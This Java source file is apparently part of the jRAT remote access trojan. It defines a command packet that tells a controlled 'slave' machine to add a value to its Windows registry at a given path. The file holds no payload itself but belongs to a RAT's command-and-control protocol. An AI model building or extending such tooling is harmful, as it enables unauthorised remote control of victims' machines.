package jrat.module.registry;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;


public class PacketAdd extends AbstractOutgoingPacket {

	private String path;
	private String name;
	private String type;
	private String data;

	public PacketAdd(String path, String name, String type, String data) {
		this.path = path;
		this.name = name;
		this.type = type;
		this.data = data;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(path);
		slave.writeLine(name);
		slave.writeLine(type);
		slave.writeLine(data);
	}

	@Override
	public short getPacketId() {
		return 97;
	}

}
